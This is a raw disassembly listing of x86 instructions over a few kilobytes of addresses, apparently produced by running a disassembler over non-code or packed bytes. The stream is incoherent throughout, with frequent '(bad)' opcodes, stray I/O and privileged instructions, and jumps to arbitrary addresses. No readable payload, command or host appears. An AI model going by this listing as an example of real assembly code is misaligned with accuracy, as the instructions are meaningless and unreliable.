  42b4f1:	stos   DWORD PTR es:[edi],eax
  42b4f2:	arpl   sp,bp
  42b4f4:	xchg   DWORD PTR [ebp+esi*2+0x1332bd57],ebx
  42b4fb:	outs   dx,BYTE PTR ds:[esi]
  42b4fc:	out    0x6a,eax
  42b4fe:	sbb    eax,0x703a4569
  42b503:	push   edx
  42b504:	rcl    dl,0x7
  42b507:	lahf   
  42b508:	sti    
  42b509:	add    al,0xdd
  42b50b:	rol    DWORD PTR [ecx],cl
  42b50d:	jae    0x42b496
  42b50f:	jae    0x42b4f1
  42b511:	addr16 push 0xffffffe6
  42b514:	je     0x42b559
  42b516:	aam    0xbe
  42b518:	and    bh,ch
  42b51a:	and    eax,0xb0ac4262
  42b51f:	arpl   WORD PTR [eax+0x8],sp
  42b522:	cdq    
  42b523:	add    al,0xeb
  42b525:	and    bl,BYTE PTR [ecx]
  42b527:	dec    esi
  42b528:	enter  0xf187,0xe5
  42b52c:	add    DWORD PTR [esi+0x6f675041],ebp
  42b532:	mov    ebx,0xdae4c27a
  42b537:	addr16 das 
  42b539:	dec    edx
  42b53a:	mov    eax,0x480f38c
  42b53f:	inc    esp
  42b540:	out    dx,al
  42b541:	push   ecx
  42b542:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b543:	cmp    eax,esp
  42b545:	inc    eax
  42b546:	imul   esp,DWORD PTR [esi-0x323e97ef],0x78c5c4d1
  42b550:	and    ecx,edi
  42b552:	push   0x3f
  42b554:	fwait
  42b555:	xchg   edi,ebp
  42b557:	xchg   edx,eax
  42b558:	pop    ebp
  42b559:	jmp    0x7bb94695
  42b55e:	and    al,0x1c
  42b560:	enter  0x2a70,0x7a
  42b564:	(bad)  
  42b565:	pop    edx
  42b566:	pop    esp
  42b567:	push   ss
  42b568:	loopne 0x42b53b
  42b56a:	jmp    0x42b5cc
  42b56c:	xlat   BYTE PTR ds:[ebx]
  42b56d:	dec    ebx
  42b56e:	imul   eax,DWORD PTR [ebx-0x5172a9cb],0x1c6bcd09
  42b578:	push   edx
  42b579:	sbb    eax,0xabfd7920
  42b57e:	test   al,0x4c
  42b580:	mov    ebx,0xa871ce1b
  42b585:	stc    
  42b586:	fld    TBYTE PTR [esi-0x3d5e7e14]
  42b58c:	jg     0x42b5f7
  42b58e:	push   0xffffff94
  42b590:	pop    es
  42b591:	repz and edx,edi
  42b594:	ja     0x42b51d
  42b596:	div    DWORD PTR [esi]
  42b598:	cmp    BYTE PTR [esi-0x6e],ch
  42b59b:	adc    al,0xb5
  42b59d:	sub    ch,BYTE PTR [edi+0x22]
  42b5a0:	clc    
  42b5a1:	adc    esp,DWORD PTR [edx+0xdaf5ceb]
  42b5a7:	and    al,0xc3
  42b5a9:	jle    0x42b5b9
  42b5ab:	xchg   ebx,eax
  42b5ac:	imul   ebp,DWORD PTR [ebx-0x37],0x8428894a
  42b5b3:	sbb    BYTE PTR [edi],dh
  42b5b5:	ja     0x42b5e6
  42b5b7:	das    
  42b5b8:	xchg   edx,eax
  42b5b9:	adc    DWORD PTR [edx-0x35],edx
  42b5bc:	cmp    ecx,DWORD PTR [esi-0x1abade1d]
	...
  42b632:	add    BYTE PTR [eax],al
  42b634:	and    al,0x16
  42b636:	outs   dx,BYTE PTR ds:[esi]
  42b637:	(bad)  
  42b638:	jle    0x42b639
  42b63a:	lods   eax,DWORD PTR ds:[esi]
  42b63b:	not    esi
  42b63d:	mov    dl,dh
  42b63f:	add    ah,ch
  42b641:	xchg   ecx,eax
  42b642:	daa    
  42b643:	mov    ch,0x2c
  42b645:	int3   
  42b646:	add    DWORD PTR [eax],eax
  42b648:	test   BYTE PTR [eax],0x0
  42b64b:	add    dh,dh
  42b64d:	in     eax,0xab
  42b64f:	dec    edx
  42b650:	int    0x84
  42b652:	pop    ebx
  42b653:	mov    al,ds:0x3137481c
  42b658:	push   ebp
  42b659:	or     DWORD PTR [ebx+0x239339],edi
  42b65f:	mov    ch,0xe6
  42b661:	push   eax
  42b662:	pushw  ds
  42b664:	jge    0x42b6b9
  42b666:	lock jecxz 0x42b688
  42b669:	data16 or al,0xaf
  42b66c:	mov    ecx,0x666df11a
  42b671:	push   edi
  42b672:	mov    edx,0xa14c6c27
  42b677:	scas   eax,DWORD PTR es:[edi]
  42b678:	or     dh,BYTE PTR [ebx-0x10]
  42b67b:	mov    esp,0x3f51e553
  42b680:	inc    esp
  42b681:	xor    eax,0x70e5dc3f
  42b686:	xlat   BYTE PTR ds:[ebx]
  42b687:	xlat   BYTE PTR ds:[ebx]
  42b688:	shl    DWORD PTR [edi],1
  42b68a:	fld    QWORD PTR [edi-0x11c5f717]
  42b690:	loope  0x42b6f1
  42b692:	inc    eax
  42b693:	std    
  42b694:	push   ebx
  42b695:	sbb    DWORD PTR [esi+0x45],esp
  42b698:	mov    ds:0xcc77ae2f,al
  42b69d:	ja     0x42b6c0
  42b69f:	sti    
  42b6a0:	mov    edi,0xd4a3e497
  42b6a5:	stos   DWORD PTR es:[edi],eax
  42b6a6:	sbb    ecx,ebp
  42b6a8:	imul   esi,DWORD PTR [ecx-0x14],0x42
  42b6ac:	popa   
  42b6ad:	mov    bl,0x2b
  42b6af:	clc    
  42b6b0:	dec    esp
  42b6b1:	retf   
  42b6b2:	xor    al,0x72
  42b6b4:	xor    dh,cl
  42b6b6:	inc    ebx
  42b6b7:	or     BYTE PTR [edx+0x59],ch
  42b6ba:	adc    BYTE PTR [eax+0x5a],bh
  42b6bd:	cmp    dh,BYTE PTR [ecx+0x28]
  42b6c0:	mov    DWORD PTR [edi+0x56d91be5],eax
  42b6c6:	pusha  
  42b6c7:	mov    BYTE PTR [ebx],al
  42b6c9:	shr    BYTE PTR [edx+0x5bcb5032],1
  42b6cf:	dec    esi
  42b6d0:	cli    
  42b6d1:	lea    edx,[ebx+0x6b]
  42b6d4:	jae    0x42b65d
  42b6d6:	sub    DWORD PTR es:[esi+0x386b6111],edi
  42b6dd:	sub    ebx,edx
  42b6df:	adc    DWORD PTR [eax],0x5a3fae45
  42b6e5:	sub    DWORD PTR [eax+0x30],0x3c923eaa
  42b6ec:	mov    ds:0x3ea3d5e0,al
  42b6f1:	mov    al,ds:0x276ccb8c
  42b6f6:	ins    DWORD PTR es:[edi],dx
  42b6f7:	shl    BYTE PTR [edi-0x66],cl
  42b6fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b6fb:	cli    
  42b6fc:	jbe    0x42b772
  42b6fe:	pop    ecx
  42b6ff:	fstp   DWORD PTR [esi+0x3]
  42b702:	cmp    DWORD PTR [eax+esi*2+0x33],0x676d04ff
  42b70a:	or     al,0x24
  42b70c:	adc    al,0xe4
  42b70e:	dec    edx
  42b70f:	nop
  42b710:	sti    
  42b711:	jl     0x42b6d2
  42b713:	lahf   
  42b714:	mov    dh,BYTE PTR [eax+0xd]
  42b717:	pop    esi
  42b718:	rcl    ebp,cl
  42b71a:	fs xchg esi,eax
  42b71c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b71d:	lods   eax,DWORD PTR ds:[esi]
  42b71e:	imul   esi,DWORD PTR [eax+0x2e],0xac4fc94f
  42b725:	and    DWORD PTR [edi],edi
  42b727:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b728:	cwde   
  42b729:	ss call 0x35d2b6cb
  42b72f:	and    dl,BYTE PTR [eax-0x55331899]
  42b735:	xchg   edx,eax
  42b736:	mov    esp,0x7e4117f5
  42b73b:	cmp    ebp,DWORD PTR [ebp-0x4d3bf37d]
  42b741:	lds    eax,FWORD PTR [eax]
	...
  42b7b3:	add    BYTE PTR [edx-0x10409c9b],cl
  42b7b9:	mov    edi,0x986a75de
  42b7be:	xor    eax,0xed081afb
  42b7c3:	sbb    DWORD PTR [edx],esp
  42b7c5:	int    0x1
  42b7c7:	add    dh,dh
  42b7c9:	add    BYTE PTR [eax],al
  42b7cb:	add    ah,ah
  42b7cd:	jecxz  0x42b7f3
  42b7cf:	pop    ecx
  42b7d0:	mov    bl,0x43
  42b7d2:	ds jno 0x42b7a6
  42b7d5:	jne    0x42b757
  42b7d7:	(bad)  
  42b7d8:	inc    edi
  42b7d9:	shl    ecx,cl
  42b7db:	div    BYTE PTR [ebx+0x247bbe37]
  42b7e1:	outs   dx,BYTE PTR ds:[esi]
  42b7e2:	aas    
  42b7e3:	pop    eax
  42b7e4:	scas   eax,DWORD PTR es:[edi]
  42b7e5:	jae    0x42b83d
  42b7e7:	mov    edx,0x659e223f
  42b7ec:	push   cs
  42b7ed:	cmc    
  42b7ee:	ror    BYTE PTR [esi],0xdf
  42b7f1:	sti    
  42b7f2:	mov    bh,0xe1
  42b7f4:	add    cl,BYTE PTR [edx-0x34]
  42b7f7:	arpl   sp,dx
  42b7f9:	push   0x12508501
  42b7fe:	gs gs addr16 popa 
  42b802:	rcl    DWORD PTR [eax],1
  42b804:	fnstsw WORD PTR [ecx]
  42b806:	test   DWORD PTR [eax+0x6b],ebp
  42b809:	mov    WORD PTR [ebx+0x45],es
  42b80c:	mov    cl,0x56
  42b80e:	jo     0x42b884
  42b810:	mov    ds:0x864bbbe3,al
  42b815:	fcom   QWORD PTR [ecx+0x708bcece]
  42b81b:	imul   edx,DWORD PTR [ecx],0xffffffd4
  42b81e:	test   al,0x9d
  42b820:	rol    BYTE PTR [ebx+ebx*1-0x19d5e710],1
  42b827:	adc    eax,0xb1341453
  42b82c:	sbb    DWORD PTR [edx+0x2a789fd],0xffffff90
  42b833:	pop    ebp
  42b834:	imul   eax,ebx,0xd15c6d7a
  42b83a:	push   es
  42b83b:	icebp  
  42b83c:	outs   dx,DWORD PTR ds:[esi]
  42b83d:	jmp    0xd18df9a
  42b842:	retf   0xb379
  42b845:	lods   al,BYTE PTR ds:[esi]
  42b846:	pop    esi
  42b847:	and    al,ah
  42b849:	xchg   esp,eax
  42b84a:	mov    eax,ds:0xc2758fe5
  42b84f:	jmp    0x3472:0x9469eeb2
  42b856:	nop
  42b857:	push   edx
  42b858:	jl     0x42b839
  42b85a:	and    BYTE PTR [esi-0x74fc75b6],0xd
  42b861:	mov    ch,0xd7
  42b863:	leave  
  42b864:	bound  ebx,QWORD PTR [eax+0x4d]
  42b867:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b868:	dec    ebp
  42b869:	or     al,0xf9
  42b86b:	repz in eax,0x94
  42b86e:	sub    ebx,eax
  42b870:	rcr    DWORD PTR [ecx+0x3f8e8151],cl
  42b876:	mov    eax,ds:0x882386d4
  42b87b:	fld    QWORD PTR [edx+0x5887da9c]
  42b881:	or     eax,DWORD PTR [ecx+0x3be7fada]
  42b887:	mov    ebp,0x32bd8739
  42b88c:	dec    ebx
  42b88d:	outs   dx,DWORD PTR ds:[esi]
  42b88e:	div    cl
  42b890:	neg    DWORD PTR [edx]
  42b892:	fwait
  42b893:	iret   
  42b894:	pop    ecx
  42b895:	push   ebx
  42b896:	push   0x59
  42b898:	(bad)  
  42b899:	or     DWORD PTR [ecx-0x48],0x9117f7e
  42b8a0:	out    dx,eax
  42b8a1:	fiadd  WORD PTR [ecx-0x1a8335fe]
  42b8a7:	out    0xad,eax
  42b8a9:	nop
  42b8aa:	xchg   DWORD PTR [ebx+eiz*8],eax
  42b8ad:	pop    esi
  42b8ae:	test   al,0x9a
  42b8b0:	lds    ecx,FWORD PTR [edi+0x53]
  42b8b3:	int3   
  42b8b4:	fld    TBYTE PTR [edx+0x6f6e8740]
  42b8ba:	xchg   ecx,eax
  42b8bb:	inc    esi
  42b8bc:	and    bh,BYTE PTR [ebx-0x195f0cec]
	...
  42b932:	add    BYTE PTR [eax],al
  42b934:	test   al,0x93
  42b936:	sbb    eax,0xfbee3fee
  42b93b:	xlat   BYTE PTR ds:[ebx]
  42b93c:	ss push esi
  42b93e:	inc    esp
  42b93f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b940:	out    0x25,al
  42b942:	xchg   ebp,eax
  42b943:	(bad)  
  42b944:	sbb    dh,cl
  42b946:	add    DWORD PTR [eax],eax
  42b948:	test   BYTE PTR [eax],0x0
  42b94b:	add    bl,dh
  42b94d:	pop    edx
  42b94e:	call   0x4935:0x4a669060
  42b955:	dec    ebx
  42b956:	sub    al,0x9b
  42b958:	mov    edi,0xdc3a065e
  42b95d:	add    eax,esp
  42b95f:	or     al,0x43
  42b961:	mov    dl,0x3c
  42b963:	call   0xafbf:0x18e4683b
  42b96a:	mov    esi,0xa4396a8d
  42b96f:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  42b971:	stc    
  42b972:	test   BYTE PTR [esi+ebx*8+0x3],ch
  42b976:	push   esi
  42b977:	pop    ss
  42b978:	rcr    BYTE PTR [ebx+0x74fb2191],1
  42b97e:	in     al,dx
  42b97f:	xor    BYTE PTR [ebx+0x50],ah
  42b982:	or     eax,0x3d94d4bf
  42b987:	cmp    BYTE PTR [ebp+0x54],bl
  42b98a:	fs das 
  42b98c:	inc    ebp
  42b98d:	push   cs
  42b98e:	mov    ecx,0xbfe5c66d
  42b993:	adc    BYTE PTR [ebx+eiz*2+0x56aa39c8],ah
  42b99a:	out    dx,al
  42b99b:	xor    al,0x32
  42b99d:	dec    edx
  42b99e:	(bad)  
  42b99f:	mov    ds:0x7bfc1823,eax
  42b9a4:	test   eax,0xb0809e52
  42b9a9:	stc    
  42b9aa:	loopne 0x42b9ae
  42b9ac:	ja     0x42b966
  42b9ae:	ret    
  42b9af:	add    esp,0x24
  42b9b2:	add    al,0xae
  42b9b4:	and    ch,cl
  42b9b6:	add    al,0x41
  42b9b8:	fild   WORD PTR [eax-0x2e]
  42b9bb:	pushf  
  42b9bc:	mov    edx,0xe7825b6a
  42b9c1:	push   ss
  42b9c2:	mov    bl,0x3c
  42b9c4:	add    esp,DWORD PTR ds:[eax+edx*1+0x64]
  42b9c9:	jmp    FWORD PTR [ecx-0x30adf1ec]
  42b9cf:	ret    0x9675
  42b9d2:	nop
  42b9d3:	test   al,0x2d
  42b9d5:	or     al,0x6a
  42b9d7:	and    ch,dh
  42b9d9:	js     0x42b9be
  42b9db:	nop
  42b9dc:	sub    al,0x9d
  42b9de:	xchg   esp,eax
  42b9df:	lfs    ebx,FWORD PTR [ecx]
  42b9e2:	pop    esp
  42b9e3:	sar    BYTE PTR [eax-0x2a53c030],cl
  42b9e9:	mov    bl,BYTE PTR [esi+0xba6f0d1]
  42b9ef:	jle    0x42ba0c
  42b9f1:	sbb    BYTE PTR [esp+ecx*1+0x59],dh
  42b9f5:	popa   
  42b9f6:	js     0x42b9ab
  42b9f8:	popa   
  42b9f9:	cmp    DWORD PTR [edi+0x656901be],edi
  42b9ff:	xchg   ebp,eax
  42ba00:	inc    edi
  42ba01:	jne    0x42b984
  42ba03:	jae    0x42ba31
  42ba05:	rcr    DWORD PTR ds:0x96bb6647,cl
  42ba0b:	pop    esp
  42ba0c:	jge    0x42ba48
  42ba0e:	xchg   ebp,eax
  42ba0f:	dec    eax
  42ba10:	out    dx,eax
  42ba11:	scas   eax,DWORD PTR es:[edi]
  42ba12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ba13:	dec    esp
  42ba14:	or     ch,dl
  42ba16:	enter  0xdd16,0x4d
  42ba1a:	pop    ebp
  42ba1b:	jmp    0x40c7:0x266bbd47
  42ba22:	xor    eax,0xf20037ac
  42ba27:	mov    ebp,0xae0bfdf0
  42ba2c:	ret    
  42ba2d:	rcl    esp,0x7c
  42ba30:	std    
  42ba31:	push   ds
  42ba32:	jne    0x42ba92
  42ba34:	fidivr DWORD PTR [ebp+edi*8+0xa]
  42ba38:	xor    cl,BYTE PTR [ecx+0x5f]
  42ba3b:	adc    edx,DWORD PTR [edi-0x56]
  42ba3e:	push   ecx
  42ba3f:	xor    DWORD PTR [edi+0x69],0x0
	...
  42bab2:	add    BYTE PTR [eax],al
  42bab4:	ds push cs
  42bab6:	sub    al,0x5d
  42bab8:	cmp    al,0x7f
  42baba:	jg     0x42bb2b
  42babc:	cmp    al,BYTE PTR [esi-0x5283bcb4]
  42bac2:	into   
  42bac3:	test   eax,0x1cf0e
  42bac8:	test   BYTE PTR [eax],0x0
  42bacb:	add    BYTE PTR [esi-0x22d04239],bl
  42bad1:	sub    BYTE PTR [ebx+0x789db331],al
  42bad7:	mov    edi,DWORD PTR [ebp-0x1c]
  42bada:	andnps xmm4,XMMWORD PTR ds:[ecx+0x1ad7241e]
  42bae2:	cmp    dl,bl
  42bae4:	stos   BYTE PTR es:[edi],al
  42bae5:	int3   
  42bae6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bae7:	ret    0x875d
  42baea:	mov    edx,0xca00789e
  42baef:	mov    ds:0xef5a78bf,eax
  42baf4:	inc    eax
  42baf5:	adc    bl,0x7e
  42baf8:	pusha  
  42baf9:	xchg   ebx,eax
  42bafa:	push   ecx
  42bafb:	je     0x42bb51
  42bafd:	sbb    eax,0x227a6451
  42bb02:	inc    eax
  42bb03:	sub    BYTE PTR [eax-0x3d],bh
  42bb06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bb07:	push   ebp
  42bb08:	adc    al,0x53
  42bb0a:	cwde   
  42bb0b:	or     eax,0x5d02fd89
  42bb10:	mov    ebp,0xeb75387b
  42bb15:	repnz or al,0xa8
  42bb18:	(bad)  
  42bb19:	jge    0x42bab1
  42bb1b:	mov    al,0x8d
  42bb1d:	jge    0x42baed
  42bb1f:	push   ss
  42bb20:	fcomp  QWORD PTR [edi+0x3db7196]
  42bb26:	stc    
  42bb27:	dec    esi
  42bb29:	xchg   BYTE PTR [ecx-0x31cea54b],dh
  42bb2f:	mov    dl,0x53
  42bb31:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42bb32:	cld    
  42bb33:	js     0x42bb58
  42bb35:	mov    edx,0x12620550
  42bb3a:	iret   
  42bb3b:	aad    0xe1
  42bb3d:	daa    
  42bb3e:	xchg   ecx,eax
  42bb3f:	push   0xe28e6b8
  42bb44:	push   ds
  42bb45:	ins    DWORD PTR es:[edi],dx
  42bb46:	adc    dl,BYTE PTR [ecx+0x5f]
  42bb49:	jb     0x42badd
  42bb4b:	mov    al,0xad
  42bb4d:	cmp    eax,0x46ea793d
  42bb52:	pop    ss
  42bb53:	jl     0x42bb57
  42bb55:	pop    eax
  42bb56:	or     eax,0xd59ec024
  42bb5b:	pushf  
  42bb5c:	es imul edi,eax,0x31cbfc78
  42bb63:	out    0x2e,al
  42bb65:	int3   
  42bb66:	pop    edx
  42bb67:	xchg   esp,eax
  42bb68:	mov    cl,bh
  42bb6a:	mov    BYTE PTR ds:0x1cc9f9eb,al
  42bb70:	jno    0x42bb6b
  42bb72:	ret    0x1eaa
  42bb75:	jno    0x42bb01
  42bb77:	stc    
  42bb78:	inc    edx
  42bb79:	mov    ch,0xf
  42bb7b:	sub    eax,0x4362d75a
  42bb80:	adc    eax,0x5789671f
  42bb85:	imul   edi,DWORD PTR [ecx-0x6],0x3e
  42bb89:	mov    esi,0xbe3d38af
  42bb8e:	xor    bl,ch
  42bb90:	mov    esi,0x21c46603
  42bb95:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bb96:	(bad)  
  42bb97:	sub    DWORD PTR [ecx-0xeade74c],esp
  42bb9d:	mov    ecx,0xd5688293
  42bba2:	icebp  
  42bba3:	fmul   QWORD PTR [edi+esi*1-0x594d3690]
  42bbaa:	mov    ah,0x32
  42bbac:	les    ecx,FWORD PTR [ebp+esi*1+0x622b5802]
  42bbb3:	pusha  
  42bbb4:	rcl    DWORD PTR [esp+eax*2+0x79b611e8],cl
  42bbbb:	mov    ?,WORD PTR ds:0x416ffd7f
  42bbc1:	bound  eax,QWORD PTR [eax]
	...
  42bc33:	add    cl,ch
  42bc35:	xor    bl,BYTE PTR [edx+edi*1]
  42bc38:	fistp  QWORD PTR [esi]
  42bc3a:	out    dx,eax
  42bc3b:	repz ffreep st(2)
  42bc3e:	(bad)  
  42bc3f:	aam    0x48
  42bc41:	inc    esi
  42bc42:	cld    
  42bc43:	out    dx,al
  42bc44:	add    al,0xd0
  42bc46:	add    DWORD PTR [eax],eax
  42bc48:	test   BYTE PTR [eax],0x0
  42bc4b:	add    BYTE PTR [eax+0x7f],bl
  42bc4e:	fnstenv [edi]
  42bc50:	lods   eax,DWORD PTR ds:[esi]
  42bc51:	xor    BYTE PTR [esi+0x48a0bf8d],cl
  42bc57:	mov    ds:0x8aebfe6d,eax
  42bc5c:	rcr    BYTE PTR [ecx],1
  42bc5e:	mov    bl,0xa9
  42bc60:	test   eax,0x5b096571
  42bc65:	loope  0x42bca7
  42bc67:	in     eax,dx
  42bc68:	ror    DWORD PTR [eax-0xe],0xcb
  42bc6c:	lods   al,BYTE PTR ds:[esi]
  42bc6d:	sub    al,0x55
  42bc70:	imul   ebp,DWORD PTR [edi],0xfffffff0
  42bc73:	or     edx,DWORD PTR ds:[edi-0x681908f5]
  42bc7a:	add    al,0xc6
  42bc7c:	push   ebp
  42bc7d:	jl     0x42bcbc
  42bc7f:	cmp    al,0xe2
  42bc81:	xor    BYTE PTR [edi+0x70],ah
  42bc84:	xchg   esi,eax
  42bc85:	nop
  42bc86:	sbb    edx,DWORD PTR [esi-0x16]
  42bc89:	scas   al,BYTE PTR es:[edi]
  42bc8a:	mov    ebp,0x8795f57a
  42bc8f:	popa   
  42bc90:	cdq    
  42bc91:	pop    es
  42bc92:	or     eax,0xf255ec0c
  42bc97:	xchg   ebp,eax
  42bc98:	(bad)  
  42bc99:	aad    0x98
  42bc9b:	daa    
  42bc9c:	cld    
  42bc9d:	icebp  
  42bc9e:	push   ebp
  42bc9f:	(bad)  
  42bca0:	es push ecx
  42bca2:	sub    dh,cl
  42bca4:	inc    esp
  42bca5:	sbb    DWORD PTR [edi],ebx
  42bca7:	mov    bl,0x4d
  42bca9:	cmp    BYTE PTR [ecx-0x68bb8e9a],cl
  42bcaf:	pop    ss
  42bcb0:	into   
  42bcb1:	ror    DWORD PTR [edi+0x5e],0xb2
  42bcb5:	fcomp  QWORD PTR [ecx+ecx*8-0x31bb0e77]
  42bcbc:	imul   edi,DWORD PTR [esi],0x1e4a51ab
  42bcc2:	aaa    
  42bcc3:	(bad)  
  42bcc4:	mov    ecx,0xe6753dac
  42bcc9:	or     ah,BYTE PTR [edx]
  42bccb:	mov    ebp,ebp
  42bccd:	push   ds
  42bcce:	mov    ebp,0x12de0ca1
  42bcd3:	mov    dh,0x2
  42bcd5:	xchg   BYTE PTR [eax-0x32a3549],cl
  42bcdb:	mov    ch,dl
  42bcdd:	fiadd  DWORD PTR [edi]
  42bcdf:	in     eax,dx
  42bce0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42bce1:	sub    DWORD PTR ds:0x40c1fd20,ecx
  42bce7:	hlt    
  42bce8:	add    ebp,edx
  42bcea:	xchg   BYTE PTR [eax],bl
  42bcec:	into   
  42bced:	xor    cl,BYTE PTR [ecx-0x54]
  42bcf0:	dec    BYTE PTR [ebx+0x45c8a7d4]
  42bcf6:	push   0xce9ae221
  42bcfb:	mov    ebp,DWORD PTR [eax+0x4]
  42bcfe:	repnz loopne 0x42bc90
  42bd01:	fwait
  42bd02:	mov    ch,0xdc
  42bd04:	pop    eax
  42bd05:	jae    0x42bd3d
  42bd07:	retf   0x9a14
  42bd0a:	cmp    ebp,DWORD PTR [ebx+ebp*8-0x5efbc289]
  42bd11:	jno    0x42bccd
  42bd13:	adc    eax,0xd0e712c2
  42bd18:	test   al,0xf9
  42bd1a:	nop
  42bd1b:	and    edx,ecx
  42bd1d:	repnz shr cl,1
  42bd20:	ror    DWORD PTR [ecx],1
  42bd22:	cmc    
  42bd23:	imul   edx,DWORD PTR [esi+0x67b93e6f],0x47
  42bd2a:	add    al,0x91
  42bd2c:	in     al,0x80
  42bd2e:	pop    esp
  42bd2f:	xchg   BYTE PTR [esi-0x6f],cl
  42bd32:	and    BYTE PTR [eax-0x44],0x4c
  42bd36:	loope  0x42bd4c
  42bd38:	cmp    BYTE PTR [eax+0x1c76daf6],cl
  42bd3e:	les    ebx,FWORD PTR [esi]
  42bd40:	sbb    eax,0xf4
	...
  42bdb1:	add    BYTE PTR [eax],al
  42bdb3:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42bdb9:	mov    edi,0x5143f7ff
  42bdbe:	jne    0x42bdcc
  42bdc0:	adc    BYTE PTR [ebp-0x6d],al
  42bdc3:	pop    ecx
  42bdc4:	cli    
  42bdc5:	rol    BYTE PTR [ecx],1
  42bdc7:	add    dh,dh
  42bdc9:	add    BYTE PTR [eax],al
  42bdcb:	add    BYTE PTR [edi],dl
  42bdcd:	stos   DWORD PTR es:[edi],eax
  42bdce:	sub    BYTE PTR [edx],0x25
  42bdd1:	addr16 retf 0x2be8
  42bdd5:	lock dec ecx
  42bdd7:	cmp    bl,0x25
  42bdda:	mov    bl,0x2a
  42bddc:	pop    esi
  42bddd:	pushf  
  42bdde:	xchg   esp,eax
  42bddf:	cwde   
  42bde0:	cdq    
  42bde1:	loopne 0x42be4d
  42bde3:	push   ss
  42bde4:	dec    ebp
  42bde5:	idiv   BYTE PTR [edx+0x332aa39f]
  42bdeb:	mov    edx,0x8cc60431
  42bdf0:	(bad)  
  42bdf1:	sbb    al,cl
  42bdf3:	jns    0x42be51
  42bdf5:	popf   
  42bdf6:	(bad)  
  42bdf8:	push   0xffffffc0
  42bdfa:	cs pushf 
  42bdfc:	stc    
  42bdfd:	or     eax,0x9f811fe0
  42be02:	pop    ecx
  42be03:	or     BYTE PTR [ebx+0x45afca20],ch
  42be09:	push   eax
  42be0a:	mov    dh,0x68
  42be0c:	push   esp
  42be0d:	shl    DWORD PTR [edi-0x56cb3b75],cl
  42be13:	(bad)  
  42be15:	out    dx,al
  42be16:	push   edi
  42be17:	push   ebp
  42be18:	mov    gs,WORD PTR [ebp+0x2f090c03]
  42be1e:	hlt    
  42be1f:	sub    DWORD PTR [esi-0x3971a07c],ebx
  42be25:	(bad)  
  42be27:	(bad)  
  42be28:	loop   0x42bdd0
  42be2a:	and    edi,DWORD PTR [edi-0xd]
  42be2d:	cmc    
  42be2e:	lock mov ?,WORD PTR [esi]
  42be31:	push   ss
  42be32:	loopne 0x42be37
  42be34:	jo     0x42bea5
  42be36:	nop
  42be37:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42be38:	test   BYTE PTR [edx],ah
  42be3a:	pop    ebp
  42be3b:	adc    al,0x29
  42be3d:	test   al,0xdb
  42be3f:	inc    eax
  42be40:	loope  0x42bdd1
  42be42:	sub    esi,DWORD PTR [ebx+0x78c6c0d1]
  42be48:	pop    es
  42be49:	cmp    al,0xe9
  42be4b:	add    al,0xd7
  42be4d:	mov    al,bl
  42be4f:	(bad)  
  42be50:	or     eax,0x67c096e3
  42be55:	scas   al,BYTE PTR es:[edi]
  42be56:	or     al,0xe5
  42be58:	mov    esp,0x84022dc7
  42be5d:	dec    ebx
  42be5e:	es out dx,eax
  42be60:	out    0x83,al
  42be62:	test   al,0xf1
  42be64:	pop    ecx
  42be65:	jmp    0x42bed3
  42be67:	cmp    edx,eax
  42be69:	lds    edx,FWORD PTR ds:0xed509037
  42be6f:	call   0x539a3068
  42be74:	dec    eax
  42be75:	pop    ecx
  42be76:	les    esp,FWORD PTR [edx]
  42be78:	pop    edi
  42be79:	pushf  
  42be7a:	out    0xc0,al
  42be7c:	fidiv  DWORD PTR [edi-0x4]
  42be7f:	out    dx,eax
  42be80:	aaa    
  42be81:	pop    ecx
  42be82:	data16 lock mov WORD PTR [ecx],fs
  42be86:	pop    edi
  42be87:	test   BYTE PTR [ebx-0x6275fa09],ch
  42be8d:	scas   eax,DWORD PTR es:[edi]
  42be8e:	and    al,BYTE PTR [esi-0x4a721f2]
  42be94:	call   0xa4bfc99
  42be99:	std    
  42be9a:	and    al,0x7c
  42be9c:	jno    0x42be4d
  42be9e:	sti    
  42be9f:	xor    al,0x62
  42bea1:	mov    esi,0x69849242
  42bea6:	sbb    esi,DWORD PTR [edi+0x5425eb06]
  42beac:	mov    ss,edi
  42beae:	test   BYTE PTR [edi],dh
  42beb0:	loope  0x42bf2e
  42beb2:	and    eax,esp
  42beb4:	lahf   
  42beb5:	xchg   esp,eax
  42beb6:	xor    al,0x57
  42beb8:	cmp    BYTE PTR [ecx+0x67],bh
  42bebb:	sahf   
  42bebc:	retf   
  42bebd:	rcl    BYTE PTR [ebx+0x63],0x52
  42bec1:	ret    0x0
	...
  42bf34:	stc    
  42bf35:	enter  0xdc7a,0x7b
  42bf39:	(bad)  
  42bf3a:	(bad)  
  42bf3b:	in     eax,dx
  42bf3c:	out    dx,al
  42bf3d:	mov    ah,0x3
  42bf3f:	dec    ecx
  42bf40:	inc    ebp
  42bf41:	add    al,BYTE PTR [eax+0x44]
  42bf44:	lock rol DWORD PTR [ecx],1
  42bf47:	add    dh,dh
  42bf49:	add    BYTE PTR [eax],al
  42bf4b:	add    BYTE PTR [ecx],bl
  42bf4d:	jmp    0x42bf1a
  42bf4f:	jl     0x42bef7
  42bf51:	pop    edi
  42bf52:	or     esi,esi
  42bf54:	lock push edi
  42bf56:	mov    edx,0xaec16c33
  42bf5b:	inc    eax
  42bf5c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42bf5d:	stos   BYTE PTR es:[edi],al
  42bf5e:	jnp    0x42bfdc
  42bf60:	in     eax,0x81
  42bf62:	sbb    BYTE PTR [edi],cl
  42bf64:	inc    ebp
  42bf65:	enter  0xef89,0xe
  42bf69:	xor    eax,0x49a4ecbb
  42bf6e:	cli    
  42bf6f:	(bad)  
  42bf70:	mov    esp,0x911e78b
  42bf75:	in     eax,dx
  42bf76:	call   0x15f0da95
